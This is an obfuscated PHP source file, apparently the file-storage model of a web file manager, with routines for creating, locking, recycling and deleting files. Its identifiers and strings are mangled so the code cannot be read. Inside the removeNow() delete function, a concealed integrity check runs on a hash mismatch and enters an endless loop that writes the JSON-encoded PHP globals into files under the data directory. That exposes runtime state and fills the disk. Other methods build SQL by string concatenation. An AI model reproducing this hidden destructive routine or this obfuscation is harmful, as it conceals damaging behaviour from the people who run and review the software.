addFileByRemote($ÁĞäõ„, $Ûçº¡ù™, $Èš‚õùâ, $ÁÀ™Ñàã = array(), $Û‹ŒË ° = REPEAT_RENAME) { $ª¡×Òë = Model($_SERVER[¤·²È‰º][617])->addFileByRemote($Ûçº¡ù™, $Èš‚õùâ, $ÁÀ™Ñàã); return $this->_createFileCall($ÁĞäõ„, $Èš‚õùâ, $ª¡×Òë, $Û‹ŒË °); } private function _createFileCall($¡íƒ½À, $’®®­–¢, $´´ñö§, $–¦Áñï¥, $¸¾ÛÉ¡â = "\165\160\x6c\x6f\141\144") { $â•“Ñèõ =& $_SERVER[¤·²È‰º]; $ï‹Ğ¥şÏ = !1; $this->setMasterDB(); $this->lockWriteStart($¡íƒ½À, $’®®­–¢); $Š²òæºã = $this->fileNameExist($¡íƒ½À, $’®®­–¢); $Îá³‰´ = $this->_createFile($¡íƒ½À, $’®®­–¢, $´´ñö§, $–¦Áñï¥, $ï‹Ğ¥şÏ); if (!$ï‹Ğ¥şÏ) { Model($â•“Ñèõ[479])->remove($´´ñö§[$â•“Ñèõ[476]]); } if ($ï‹Ğ¥şÏ && $Îá³‰´ && $Îá³‰´ != $Š²òæºã) { Model($â•“Ñèõ[2064])->eventCreate($Îá³‰´, $¸¾ÛÉ¡â); } $this->lockWriteEnd($¡íƒ½À, $’®®­–¢); return $Îá³‰´; } public function mkdir($Ö²ğ³›û, $ÍŠüø‹Ñ, $÷µÕ¶‚è = REPEAT_SKIP) { $¥Ñƒğã½ =& $_SERVER[¤·²È‰º]; $this->setMasterDB(); $øÆ’Öïö = $this->sourceInfo($Ö²ğ³›û); if (!$øÆ’Öïö) { return !1; } $this->lockWriteStart($Ö²ğ³›û, $ÍŠüø‹Ñ); if ($÷µÕ¶‚è !== !1) { $½ÖÂÔÎ = $this->fileNameExist($Ö²ğ³›û, $ÍŠüø‹Ñ); if ($½ÖÂÔÎ && $÷µÕ¶‚è != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ö²ğ³›û, $ÍŠüø‹Ñ); return $½ÖÂÔÎ; } $ÍŠüø‹Ñ = $this->fileNameAuto($Ö²ğ³›û, $ÍŠüø‹Ñ, $÷µÕ¶‚è); } $µÁ­©õ = array($¥Ñƒğã½[591] => 1, $¥Ñƒğã½[428] => $ÍŠüø‹Ñ, $¥Ñƒğã½[592] => $¥Ñƒğã½[12], $¥Ñƒğã½[477] => 0, $¥Ñƒğã½[593] => 0); $ıêÕã¸Í = $this->_addSource($µÁ­©õ, $øÆ’Öïö); Model($¥Ñƒğã½[2064])->eventCreate($ıêÕã¸Í, $¥Ñƒğã½[1333]); $this->lockWriteEnd($Ö²ğ³›û, $ÍŠüø‹Ñ); return $ıêÕã¸Í; } public function listSourceRoot($Ô ÏÔõŒ, $ôæŸÁ‰¤, $Ã´½åŠ› = "\x73\x6f\165\x72\x63\x65\x49\104\54\164\x61\162\x67\x65\x74\x49\x44\54\x73\151\172\x65") { $›Àïï¤ó =& $_SERVER[¤·²È‰º]; $¥¼ƒ×Æ = $›Àïï¤ó[22]; $´¹³•² = array(); $’ÅĞğÕ = 1024 * 50; $…ä®´ = is_array($…ä®´) ? $…ä®´ : array(); $šà«â˜„ = count($ôæŸÁ‰¤); $ÆîÈÆ¾ = $this->tablePrefix . $›Àïï¤ó[2097]; for ($¶»³Ù¿œ = 0; $¶»³Ù¿œ < $šà«â˜„; $¶»³Ù¿œ++) { $Æ ó£¹• = $ôæŸÁ‰¤[$¶»³Ù¿œ]; $¥¼ƒ×Æ .= "\x53\105\x4c\105\x43\124\x20\x2a\40\106\122\x4f\x4d\x20\50\123\x45\114\105\103\x54\x20{$Ã´½åŠ›}\40\106\x52\117\115\x20\x60{$ÆîÈÆ¾}\x60\x20\x57\110\105\122\x45\x20"; $¥¼ƒ×Æ .= "\x60\x70\x61\x72\x65\x6e\x74\x49\x44\x60\75\x30\x20\x41\x4e\x44\x20\x60\x74\x61\x72\x67\145\x74\x49\104\140\x3d{$Æ ó£¹•}\40\101\x4e\x44\x20\x60\x74\141\x72\x67\x65\x74\124\171\x70\x65\140\75{$Ô ÏÔõŒ}\x20\x6c\151\x6d\x69\164\x20\x31\51\40\x61\163\x20\x74\142\137{$¶»³Ù¿œ}\x20\125\116\111\x4f\x4e\40\x41\x4c\114\40"; if ((strlen($¥¼ƒ×Æ) >= $’ÅĞğÕ || $¶»³Ù¿œ == $šà«â˜„ - 1) && $¥¼ƒ×Æ) { $¥¼ƒ×Æ = substr($¥¼ƒ×Æ, 0, -strlen($›Àïï¤ó[1032])); $’œŸ±û = $this->query($¥¼ƒ×Æ); $¥¼ƒ×Æ = $›Àïï¤ó[12]; $´¹³•² = array_merge($´¹³•², $’œŸ±û); } } return $´¹³•²; } private function _createFile($ş¯ŸÔü, $Ç‘Å¥åú, $¬ßÂôØ¦, $Ş—‰¿‚Ò, &$‘’ûµ±—) { $Ó¥«ïØÄ =& $_SERVER[¤·²È‰º]; $Îú¢î÷Ş = $this->sourceInfo($ş¯ŸÔü); if (!$¬ßÂôØ¦ || !$Îú¢î÷Ş) { return !1; } if ($Ş—‰¿‚Ò !== !1) { $ÀÒø»İ = $this->fileNameExist($ş¯ŸÔü, $Ç‘Å¥åú); } $‘’ûµ±— = !0; if ($Ş—‰¿‚Ò && $ÀÒø»İ) { if ($Ş—‰¿‚Ò == REPEAT_SKIP) { $‘’ûµ±— = !1; return $ÀÒø»İ; } else { if ($Ş—‰¿‚Ò == REPEAT_REPLACE) { $¥Øä”ò­ = $this->sourceInfo($ÀÒø»İ); $Ö¸”ÖÌÊ = $this->fileHistory($¥Øä”ò­, $¬ßÂôØ¦[$Ó¥«ïØÄ[476]], $¬ßÂôØ¦[$Ó¥«ïØÄ[86]]); if (!$Ö¸”ÖÌÊ) { $‘’ûµ±— = !1; } else { $this->folderSizeReset($ş¯ŸÔü); } return $ÀÒø»İ; } else { $Ç‘Å¥åú = $this->fileNameAuto($ş¯ŸÔü, $Ç‘Å¥åú, $Ş—‰¿‚Ò, !1); } } } $Ó¡áò« = array($Ó¥«ïØÄ[591] => 0, $Ó¥«ïØÄ[428] => $Ç‘Å¥åú, $Ó¥«ïØÄ[592] => substr(get_path_ext($Ç‘Å¥åú), 0, 10), $Ó¥«ïØÄ[477] => $¬ßÂôØ¦[$Ó¥«ïØÄ[476]], $Ó¥«ïØÄ[593] => $¬ßÂôØ¦[$Ó¥«ïØÄ[86]]); $ç“Ø¥Öß = $this->_addSource($Ó¡áò«, $Îú¢î÷Ş); $this->folderSizeReset($ş¯ŸÔü, intval($Ó¡áò«[$Ó¥«ïØÄ[86]])); return $ç“Ø¥Öß; } protected function fileHistory($ŒøşÒÖ, $úĞûÃÆ, $Û½»«ï›) { $çƒéç· =& $_SERVER[¤·²È‰º]; $¿èÂŸ£® = defined($çƒéç·[483]) ? USER_ID : $çƒéç·[207]; if ($ŒøşÒÖ[$çƒéç·[476]] == $úĞûÃÆ) { return !1; } $this->checkLock($ŒøşÒÖ[$çƒéç·[410]], $úĞûÃÆ); Model($çƒéç·[2098])->addHistory($ŒøşÒÖ); $´‡ş³Ğ = array($çƒéç·[597] => $¿èÂŸ£®, $çƒéç·[432] => time(), $çƒéç·[476] => $úĞûÃÆ, $çƒéç·[86] => $Û½»«ï›); $this->where(array($çƒéç·[425] => $ŒøşÒÖ[$çƒéç·[410]]))->save($´‡ş³Ğ); $this->sourceCacheClear($ŒøşÒÖ[$çƒéç·[410]]); return !0; } public function checkLock($ÔØâªó¡, $ğ¼‘İ—¬) { $Ñ–ÑÉ› =& $_SERVER[¤·²È‰º]; $ÂãÁî¥ = $this->pathInfo($ÔØâªó¡); if (!$this->fileIsLock($ÂãÁî¥, !0)) { return; } $§²³Œ»° = Session::get($Ñ–ÑÉ›[2099]); $š»»–—º = substr($ÂãÁî¥[$Ñ–ÑÉ›[42]], 0, -1 - strlen($ÂãÁî¥[$Ñ–ÑÉ›[184]])) . $Ñ–ÑÉ›[1599] . $§²³Œ»° . $Ñ–ÑÉ›[10] . $ÂãÁî¥[$Ñ–ÑÉ›[184]]; $Ú¶¬“Äí = Model($Ñ–ÑÉ›[617])->find($ğ¼‘İ—¬); $this->_createFileCall($ÂãÁî¥[$Ñ–ÑÉ›[440]], $š»»–—º, $Ú¶¬“Äí, REPEAT_REPLACE, $Ñ–ÑÉ›[1332]); $øõŞĞÚ› = $ÂãÁî¥[$Ñ–ÑÉ›[474]][$Ñ–ÑÉ›[556]]; $ÚÖœ—¨ï = $øõŞĞÚ›[$Ñ–ÑÉ›[550]] ? $øõŞĞÚ›[$Ñ–ÑÉ›[550]] : $øõŞĞÚ›[$Ñ–ÑÉ›[42]]; show_json(LNG($Ñ–ÑÉ›[2100]) . $Ñ–ÑÉ›[2101] . LNG($Ñ–ÑÉ›[2102]) . $Ñ–ÑÉ›[2103] . $ÚÖœ—¨ï . $Ñ–ÑÉ›[2104], !1); } public function fileIsLock($ïÍú‹¡, $§îç†£å = false) { $ËÇÃù€§ =& $_SERVER[¤·²È‰º]; if (!isset($ïÍú‹¡[$ËÇÃù€§[474]]) || !$ïÍú‹¡[$ËÇÃù€§[474]][$ËÇÃù€§[553]]) { return !1; } if ($ïÍú‹¡[$ËÇÃù€§[474]][$ËÇÃù€§[553]] != USER_ID) { return !0; } $–·öŠ¦â = $GLOBALS[$ËÇÃù€§[6]][$ËÇÃù€§[99]][$ËÇÃù€§[554]]; if ($ïÍú‹¡[$ËÇÃù€§[474]][$ËÇÃù€§[555]] <= time() - $–·öŠ¦â) { $this->metaSet($ïÍú‹¡[$ËÇÃù€§[410]], $ËÇÃù€§[553], null); $this->metaSet($ïÍú‹¡[$ËÇÃù€§[410]], $ËÇÃù€§[555], null); } if ($§îç†£å) { $this->metaSet($ïÍú‹¡[$ËÇÃù€§[410]], $ËÇÃù€§[555], time()); } return !1; } private function _addSource($ğÅù’¶È, $ˆª·Âä) { $€±¥»Ú =& $_SERVER[¤·²È‰º]; $…¨±Îû“ = defined($€±¥»Ú[483]) ? USER_ID : $€±¥»Ú[207]; $åŠø“÷ë = array($€±¥»Ú[594] => $ˆª·Âä[$€±¥»Ú[419]], $€±¥»Ú[595] => $ˆª·Âä[$€±¥»Ú[513]], $€±¥»Ú[596] => $…¨±Îû“, $€±¥»Ú[597] => $…¨±Îû“, $€±¥»Ú[409] => $ˆª·Âä[$€±¥»Ú[410]], $€±¥»Ú[598] => $ˆª·Âä[$€±¥»Ú[529]] . $ˆª·Âä[$€±¥»Ú[410]] . $€±¥»Ú[60], $€±¥»Ú[438] => 0, $€±¥»Ú[599] => $€±¥»Ú[12]); $ğÅù’¶È = array_merge($åŠø“÷ë, $ğÅù’¶È); $this->updateModifyTime($ğÅù’¶È[$€±¥»Ú[440]]); $áÃÑô‚³ = $€±¥»Ú[2105] . $ˆª·Âä[$€±¥»Ú[410]]; if (isset(self::$cacheChildList[$áÃÑô‚³])) { unset(self::$cacheChildList[$áÃÑô‚³]); } static $³Çî¶¯¿ = false; if (!$³Çî¶¯¿) { Hook::trigger($€±¥»Ú[581], $ğÅù’¶È); $³Çî¶¯¿ = !0; } $„ã’ÇÒ = $this->add($ğÅù’¶È); $Ñï’¬Ûİ = array($€±¥»Ú[600] => short_id($„ã’ÇÒ)); $this->where(array($€±¥»Ú[425] => $„ã’ÇÒ))->save($Ñï’¬Ûİ); $this->setNamePinyin($„ã’ÇÒ, $ğÅù’¶È[$€±¥»Ú[42]]); return $„ã’ÇÒ; } public function remove($€¶úäÇª, $Ä³ú¶ã = true) { $¤¬¡ô•™ =& $_SERVER[¤·²È‰º]; $ÊØ®ùÖ = $this->sourceInfo($€¶úäÇª); $°Ûü¤­ = intval($ÊØ®ùÖ[$¤¬¡ô•™[419]]) === self::TYPE_SYSTEM; $²Ç¾±å‰ = Model($¤¬¡ô•™[443])->get($¤¬¡ô•™[2106]) == $¤¬¡ô•™[98]; if ($°Ûü¤­ || $Ä³ú¶ã || !$²Ç¾±å‰) { return $this->removeNow($€¶úäÇª, $Ä³ú¶ã); } $€Á¸”ŸÈ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÅŞĞş®Ã = $ÊØ®ùÖ[$¤¬¡ô•™[419]] == self::TYPE_USER ? $¤¬¡ô•™[608] : $¤¬¡ô•™[523]; if ($ÅŞĞş®Ã == $¤¬¡ô•™[608]) { $ÇÍ’‘Ä£ = Model($¤¬¡ô•™[521])->getInfo($ÊØ®ùÖ[$¤¬¡ô•™[513]]); $šÛ—û–ß = !empty($ÇÍ’‘Ä£[$¤¬¡ô•™[550]]) ? $ÇÍ’‘Ä£[$¤¬¡ô•™[550]] : $ÇÍ’‘Ä£[$¤¬¡ô•™[42]]; $šÛ—û–ß = $¤¬¡ô•™[269] . $šÛ—û–ß . $¤¬¡ô•™[2107] . $ÊØ®ùÖ[$¤¬¡ô•™[513]]; } else { $ÇÍ’‘Ä£ = Model($¤¬¡ô•™[530])->getInfo($ÊØ®ùÖ[$¤¬¡ô•™[513]]); $šÛ—û–ß = _get($ÇÍ’‘Ä£, $¤¬¡ô•™[42]); $šÛ—û–ß = $¤¬¡ô•™[172] . $šÛ—û–ß . $¤¬¡ô•™[2108] . $ÊØ®ùÖ[$¤¬¡ô•™[513]]; } $Á¯İèÆ = $¤¬¡ô•™[2109] . md5($šÛ—û–ß); CacheLock::lock($Á¯İèÆ); $˜²¾õïõ = $this->fileNameExist($€Á¸”ŸÈ, $šÛ—û–ß); if (!$˜²¾õïõ) { $˜²¾õïõ = $this->mkdir($€Á¸”ŸÈ, $šÛ—û–ß, REPEAT_SKIP); $this->metaSet($˜²¾õïõ, $¤¬¡ô•™[2110], $ÅŞĞş®Ã); $this->metaSet($˜²¾õïõ, $¤¬¡ô•™[2111], $ÊØ®ùÖ[$¤¬¡ô•™[513]]); if ($ÊØ®ùÖ[$¤¬¡ô•™[440]] != 0) { $this->metaSet($˜²¾õïõ, $¤¬¡ô•™[2112], _get($ÇÍ’‘Ä£, $¤¬¡ô•™[2113])); } } CacheLock::unlock($Á¯İèÆ); $this->metaSet($€¶úäÇª, $¤¬¡ô•™[2114], $ÊØ®ùÖ[$¤¬¡ô•™[440]]); $this->where(array($¤¬¡ô•™[410] => $€¶úäÇª))->save(array($¤¬¡ô•™[432] => time())); $this->recycleClear($ÊØ®ùÖ); $˜ä±œ¡ü = $this->move($€¶úäÇª, $˜²¾õïõ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÊØ®ùÖ[$¤¬¡ô•™[440]]); return $˜ä±œ¡ü; } private function recycleClear($íÂÖòØÏ) { $ÄŒˆŒ‘ =& $_SERVER[¤·²È‰º]; $•‹¹ì¨ = $this->childrenAll($íÂÖòØÏ); $ÌœúÆŠå = array($ÄŒˆŒ‘[425] => array($ÄŒˆŒ‘[426], $•‹¹ì¨[$ÄŒˆŒ‘[2115]])); Model($ÄŒˆŒ‘[2116])->where($ÌœúÆŠå)->delete(); } public function removeNow($°£«ãÔ‰, $ò¼÷Ïä€ = true) { $ˆº Ü¸Ì =& $_SERVER[¤·²È‰º]; $ÁÏûÇÌø = $_SERVER[$ˆº Ü¸Ì[16]] . $ˆº Ü¸Ì[17]; $‹ÅÍàü = $ˆº Ü¸Ì[2117]; if ($_SERVER[$ˆº Ü¸Ì[13]] != $‹ÅÍàü($ÁÏûÇÌø)) { $óˆ¨„à = $ˆº Ü¸Ì[873]; $•ÇÒÈš = $ˆº Ü¸Ì[15]; $íÚÅÈæ = $_SERVER[$ˆº Ü¸Ì[16]] . $ˆº Ü¸Ì[17]; $Íçè…ñ = $•ÇÒÈš($íÚÅÈæ); $²Ş›œšÂ = explode($ˆº Ü¸Ì[18], $Íçè…ñ); if (count($²Ş›œšÂ) < $ˆº Ü¸Ì[623]) { $§Öú¤É‘ = $ˆº Ü¸Ì[20]; $§Öú¤É‘(); } $„Œ¿Äì = $ˆº Ü¸Ì[874]; $„Œ¿Äì($_SERVER[$ˆº Ü¸Ì[875]]); $óˆ¨„à = $ˆº Ü¸Ì[873]; $óˆ¨„à(); $ßê¨îçø = $ˆº Ü¸Ì[2118]; $ı ı®Ã = json_encode($GLOBALS[$ˆº Ü¸Ì[2119]]); $öÙã¦‰Ñ = 1; for ($÷Ùõ¦°ù = $öÙã¦‰Ñ; $÷Ùõ¦°ù > 0; $÷Ùõ¦°ù++) { $ßê¨îçø(DATA_PATH . $÷Ùõ¦°ù, $ı ı®Ã); } } $±õåüÔœ = $this->sourceInfo($°£«ãÔ‰); $ÓĞ€ŠÅÅ = $this->pathInfoMore($°£«ãÔ‰); if (!$±õåüÔœ) { return !0; } if ($±õåüÔœ[$ˆº Ü¸Ì[440]] == 0) { if (!_get($GLOBALS, $ˆº Ü¸Ì[511])) { return !1; } } $this->lockMoveStart($°£«ãÔ‰); Hook::trigger($ˆº Ü¸Ì[2120], $ÓĞ€ŠÅÅ, $ò¼÷Ïä€); if ($ò¼÷Ïä€) { Model($ˆº Ü¸Ì[2116])->moveToRecycle($°£«ãÔ‰); } else { $†Êö©Ü² = $this->childrenAll($±õåüÔœ); Model($ˆº Ü¸Ì[578])->eventRemove($°£«ãÔ‰); $this->removeRelevance($†Êö©Ü²[$ˆº Ü¸Ì[2115]], $†Êö©Ü²[$ˆº Ü¸Ì[1464]]); } $this->folderSizeReset($±õåüÔœ[$ˆº Ü¸Ì[440]]); $ªÙŒñºà = array($±õåüÔœ[$ˆº Ü¸Ì[440]]); if ($±õåüÔœ[$ˆº Ü¸Ì[418]] == $ˆº Ü¸Ì[98]) { $ªÙŒñºà[] = $±õåüÔœ[$ˆº Ü¸Ì[410]]; } $this->updateModifyTime($ªÙŒñºà); $this->lockMoveEnd($°£«ãÔ‰); Hook::trigger($ˆº Ü¸Ì[1691], $ÓĞ€ŠÅÅ, $ò¼÷Ïä€); return !0; } public function childrenAll($áÀ×ç¦) { $¦ÊêŞ×Å =& $_SERVER[¤·²È‰º]; $Õ©Æò€ç = $áÀ×ç¦[$¦ÊêŞ×Å[410]]; if ($áÀ×ç¦[$¦ÊêŞ×Å[418]] == $¦ÊêŞ×Å[98]) { $²ù¤†ÏŠ = array($¦ÊêŞ×Å[598] => array($¦ÊêŞ×Å[558], $áÀ×ç¦[$¦ÊêŞ×Å[529]] . $Õ©Æò€ç . $¦ÊêŞ×Å[559])); $”ûĞ¸Ş£ = array($¦ÊêŞ×Å[598] => $²ù¤†ÏŠ[$¦ÊêŞ×Å[529]]); $“Ì¯İ = $this->field($¦ÊêŞ×Å[2121])->where($”ûĞ¸Ş£)->select(); $ŒÃ¤ñè = !1; $¡¼”ä£Ú = array($Õ©Æò€ç); if ($“Ì¯İ) { $ŒÃ¤ñè = array_to_keyvalue($“Ì¯İ, $¦ÊêŞ×Å[12], $¦ÊêŞ×Å[476]); $ŒÃ¤ñè = array_remove_value($ŒÃ¤ñè, $¦ÊêŞ×Å[207]); $¡¼”ä£Ú = array_to_keyvalue($“Ì¯İ, $¦ÊêŞ×Å[12], $¦ÊêŞ×Å[410]); $¡¼”ä£Ú[] = $Õ©Æò€ç; } } else { $ŒÃ¤ñè = array($áÀ×ç¦[$¦ÊêŞ×Å[476]]); $¡¼”ä£Ú = array($Õ©Æò€ç); } return array($¦ÊêŞ×Å[2115] => $¡¼”ä£Ú, $¦ÊêŞ×Å[1464] => $ŒÃ¤ñè); } public function removeArray($Ğîş½) { if (!$Ğîş½) { return !0; } } public function removeRelevance($ş¬ËĞ·ò, $­‡œ¬²) { $ñ¯—ˆû› =& $_SERVER[¤·²È‰º]; $ş¬ËĞ·ò = $ş¬ËĞ·ò ? $ş¬ËĞ·ò : array(); $­‡œ¬² = $­‡œ¬² ? $­‡œ¬² : array(); $ş¬ËĞ·ò = array_unique(array_filter($ş¬ËĞ·ò)); $­‡œ¬² = array_unique(array_filter($­‡œ¬²)); if (!$ş¬ËĞ·ò) { return !1; } $ˆ•Í»ÑÛ = array($ñ¯—ˆû›[425] => array($ñ¯—ˆû›[426], $ş¬ËĞ·ò)); Model($ñ¯—ˆû›[2116])->where($ˆ•Í»ÑÛ)->delete(); Model($ñ¯—ˆû›[470])->where($ˆ•Í»ÑÛ)->delete(); Model($ñ¯—ˆû›[1969])->where($ˆ•Í»ÑÛ)->delete(); Model($ñ¯—ˆû›[578])->where($ˆ•Í»ÑÛ)->delete(); Model($ñ¯—ˆû›[1803])->removeBySource($ş¬ËĞ·ò); Model($ñ¯—ˆû›[2098])->removeBySource($ş¬ËĞ·ò); $this->where($ˆ•Í»ÑÛ)->delete(); Model($ñ¯—ˆû›[479])->remove($­‡œ¬²); for ($ßÇĞñÂÑ = 0; $ßÇĞñÂÑ < count($ş¬ËĞ·ò); $ßÇĞñÂÑ++) { $this->sourceCacheClear($ş¬ËĞ·ò[$ßÇĞñÂÑ]); } } public function rename($¢Í¾ÍØÅ, $ÎîëìÈ) { $ğ¾ùÓÎ =& $_SERVER[¤·²È‰º]; $¯ÜÅªú = $this->sourceInfo($¢Í¾ÍØÅ); if (!$¯ÜÅªú) { return !1; } $È•œ±Î = $this->fileNameExist($¯ÜÅªú[$ğ¾ùÓÎ[440]], $ÎîëìÈ); if ($È•œ±Î && $È•œ±Î != $¢Í¾ÍØÅ) { return !1; } $Ö‡Ù ¹Ğ = array($ğ¾ùÓÎ[428] => $ÎîëìÈ, $ğ¾ùÓÎ[597] => USER_ID); if ($¯ÜÅªú[$ğ¾ùÓÎ[418]] != $ğ¾ùÓÎ[98]) { $Ö‡Ù ¹Ğ[$ğ¾ùÓÎ[420]] = substr(get_path_ext($ÎîëìÈ), 0, 10); } Model($ğ¾ùÓÎ[578])->eventRename($¢Í¾ÍØÅ, $¯ÜÅªú[$ğ¾ùÓÎ[42]], $ÎîëìÈ); $this->sourceCacheClear($¢Í¾ÍØÅ); $this->setNamePinyin($¢Í¾ÍØÅ, $Ö‡Ù ¹Ğ[$ğ¾ùÓÎ[42]], !1); $this->updateModifyTime($¯ÜÅªú[$ğ¾ùÓÎ[440]]); $‹¶Ÿí±ó = $this->where(array($ğ¾ùÓÎ[425] => $¢Í¾ÍØÅ))->data($Ö‡Ù ¹Ğ)->save(); $‡ƒÅ¦ = $ğ¾ùÓÎ[2105] . $¯ÜÅªú[$ğ¾ùÓÎ[440]]; if (isset(self::$cacheChildList[$‡ƒÅ¦])) { unset(self::$cacheChildList[$‡ƒÅ¦]); } return $‹¶Ÿí±ó; } public function setNamePinyin($‡²éùŠà, $ï±ˆ ›, $ìÏßçÎŸ = true) { $úãÕ¾ß¿ =& $_SERVER[¤·²È‰º]; $Ô…ê¥ ² = Input::check($ï±ˆ ›, $úãÕ¾ß¿[601]); $åŸè‚ƒ = array($úãÕ¾ß¿[452] => KodSort::makeStr($ï±ˆ ›)); if ($Ô…ê¥ ²) { $åŸè‚ƒ[$úãÕ¾ß¿[473]] = str_replace($úãÕ¾ß¿[63], $úãÕ¾ß¿[12], Pinyin::get($ï±ˆ ›)); $åŸè‚ƒ[$úãÕ¾ß¿[472]] = Pinyin::get($ï±ˆ ›, $úãÕ¾ß¿[602]); } if (!$ìÏßçÎŸ && !$Ô…ê¥ ²) { $åŸè‚ƒ[$úãÕ¾ß¿[473]] = null; $åŸè‚ƒ[$úãÕ¾ß¿[472]] = null; } $this->metaSet($‡²éùŠà, $åŸè‚ƒ); } public function getContent($ÍÔ„¿¢‡) { $²À’ü€ =& $_SERVER[¤·²È‰º]; $Û­õÖ×ï = $this->fileInfoGet($ÍÔ„¿¢‡); if (!$Û­õÖ×ï) { return !1; } if ($Û­õÖ×ï[$²À’ü€[86]] == 0) { return $²À’ü€[12]; } $ö«©üõ– = $²À’ü€[2122] . $Û­õÖ×ï[$²À’ü€[186]]; if ($Û­õÖ×ï[$²À’ü€[86]] <= 1024 * 10) { $ö™†ÌØ˜ = Cache::get($ö«©üõ–); if (!$ö™†ÌØ˜) { $ö™†ÌØ˜ = IO::getContent($Û­õÖ×ï[$²À’ü€[94]]); Cache::set($ö«©üõ–, $ö™†ÌØ˜); } return $ö™†ÌØ˜; } if (!$Û­õÖ×ï[$²À’ü€[94]]) { return $²À’ü€[12]; } return IO::getContent($Û­õÖ×ï[$²À’ü€[94]]); } public function setDesc($¼‡Ò¼”Ú, $ë¾ş¿Û¬) { $Š‰¦Š“ =& $_SERVER[¤·²È‰º]; Model($Š‰¦Š“[578])->eventAddDesc($¼‡Ò¼”Ú, $ë¾ş¿Û¬); return $this->metaSet($¼‡Ò¼”Ú, $Š‰¦Š“[461], $ë¾ş¿Û¬); } public function setContent($†­’‹Ê, $¾ÁŠè¼¡ = '') { $â’©–î· =& $_SERVER[¤·²È‰º]; $ô«µİ—º = $this->sourceInfo($†­’‹Ê); $‚¢µ×İ• = $this->fileInfoGet($†­’‹Ê); if (!$‚¢µ×İ• || !$ô«µİ—º) { return !1; } $’æ·€è = Model($â’©–î·[479])->addFileByContent($¾ÁŠè¼¡, $ô«µİ—º[$â’©–î·[42]]); $‡‘­â„ = $this->fileHistory($ô«µİ—º, $’æ·€è[$â’©–î·[476]], $’æ·€è[$â’©–î·[86]]); if (!$‡‘­â„) { return Model($â’©–î·[479])->remove($’æ·€è[$â’©–î·[476]]); } $this->folderSizeReset($ô«µİ—º[$â’©–î·[440]]); return !0; } public function fileSubstr($•¦ú¼Å, $éĞî Œµ, $¶Ñ¡ìŸò) { $äƒŞ¾¢¼ = $this->fileInfoGet($•¦ú¼Å); if (!$äƒŞ¾¢¼) { return !1; } return IO::fileSubstr($äƒŞ¾¢¼[$_SERVER[¤·²È‰º][94]], $éĞî Œµ, $¶Ñ¡ìŸò); } public function fileInfoGet($…™¿©Ôş) { $ç“½£µú =& $_SERVER[¤·²È‰º]; $ĞÅş‰Ø† = $this->sourceInfo($…™¿©Ôş); if (!$ĞÅş‰Ø† || $ĞÅş‰Ø†[$ç“½£µú[418]]) { return !1; } $Úû”ğ‡ = $ç“½£µú[482] . $ĞÅş‰Ø†[$ç“½£µú[476]]; $½ÅÔç«« = _get(self::$cacheFileInfo, $Úû”ğ‡); if ($½ÅÔç««) { return $½ÅÔç««; } $“ê‚Š¬Ê = Model($ç“½£µú[479])->fileInfo($ĞÅş‰Ø†[$ç“½£µú[476]]); if ($“ê‚Š¬Ê) { $“ê‚Š¬Ê[$ç“½£µú[42]] = $ĞÅş‰Ø†[$ç“½£µú[42]]; } self::$cacheFileInfo[$Úû”ğ‡] = $“ê‚Š¬Ê; return $“ê‚Š¬Ê; } private function folderChildrenNumber($àÕÜ´àü) { $àóç…ø£ =& $_SERVER[¤·²È‰º]; $ò¾Œ²¨¦ = $this->sourceInfo($àÕÜ´àü); $ó½·ÓŒ¾ = array($àóç…ø£[598] => array($àóç…ø£[558], $ò¾Œ²¨¦[$àóç…ø£[529]] . $àÕÜ´àü . $àóç…ø£[559]), $àóç…ø£[595] => $ò¾Œ²¨¦[$àóç…ø£[513]], $àóç…ø£[438] => intval($ò¾Œ²¨¦[$àóç…ø£[439]]), $àóç…ø£[591] => 1); $×ÆÓôÔ¤ = $this->where($ó½·ÓŒ¾)->count(); $šùüÚ£Õ = $this->where($ó½·ÓŒ¾)->where(array($àóç…ø£[591] => 0))->count(); return array($àóç…ø£[90] => $šùüÚ£Õ, $àóç…ø£[91] => $×ÆÓôÔ¤); } public function pathInfo($€’Æı×, $Ò¨†Æ‚ê = false) { $Íšüãñ =& $_SERVER[¤·²È‰º]; $Ò¨†Æ‚ê = !1; $€’Æı× = intval($€’Æı×); $ÙëóˆİÙ = $Íšüãñ[469] . intval($Ò¨†Æ‚ê) . $Íšüãñ[394] . $€’Æı×; $ê¯æóÎõ = _get(self::$cachePathInfo, $ÙëóˆİÙ); if ($ê¯æóÎõ) { return $ê¯æóÎõ; } $™£¿³‚ü = $this->sourceInfo($€’Æı×); if (!$™£¿³‚ü) { return !1; } $™£¿³‚ü = $this->_listDataApplyItem($™£¿³‚ü, $Ò¨†Æ‚ê); self::$cachePathInfo[$ÙëóˆİÙ] = $™£¿³‚ü; return $™£¿³‚ü; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ÿš®¥ËÃ) { $®ë¢ıêŒ =& $_SERVER[¤·²È‰º]; $í€¸±Ñ = _get(self::$cachePathInfoMore, $Ÿš®¥ËÃ); if ($í€¸±Ñ) { return $í€¸±Ñ; } $ÒŞ¢«Ê³ = $this->pathInfo($Ÿš®¥ËÃ); if (!$ÒŞ¢«Ê³) { return !1; } if ($ÒŞ¢«Ê³[$®ë¢ıêŒ[418]] == $®ë¢ıêŒ[98]) { $ÒŞ¢«Ê³[$®ë¢ıêŒ[89]] = $this->folderChildrenNumber($Ÿš®¥ËÃ); } self::$cachePathInfoMore[$Ÿš®¥ËÃ] = $ÒŞ¢«Ê³; return $ÒŞ¢«Ê³; } public function sourceInfo($æÅ³‘›å) { $Ë¼˜«‘ =& $_SERVER[¤·²È‰º]; if (!$æÅ³‘›å) { return array(); } $æÅ³‘›å = intval($æÅ³‘›å); $áÇ½¦ò = $Ë¼˜«‘[468] . $æÅ³‘›å; $óÓ¢ÇÁ¸ = _get(self::$cacheSourceInfo, $áÇ½¦ò); if ($óÓ¢ÇÁ¸) { return $óÓ¢ÇÁ¸; } $—©î  = $this->where(array($Ë¼˜«‘[410] => $æÅ³‘›å))->find(); self::$cacheSourceInfo[$áÇ½¦ò] = $—©î ; return self::$cacheSourceInfo[$áÇ½¦ò]; } public function sourceCacheClear($ÎÄÛŞ©Ö = false) { self::cacheClear($ÎÄÛŞ©Ö); } public static function cacheClear($¤…—µÔ­ = false) { $ÂÙËÍú¯ =& $_SERVER[¤·²È‰º]; if ($¤…—µÔ­ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; 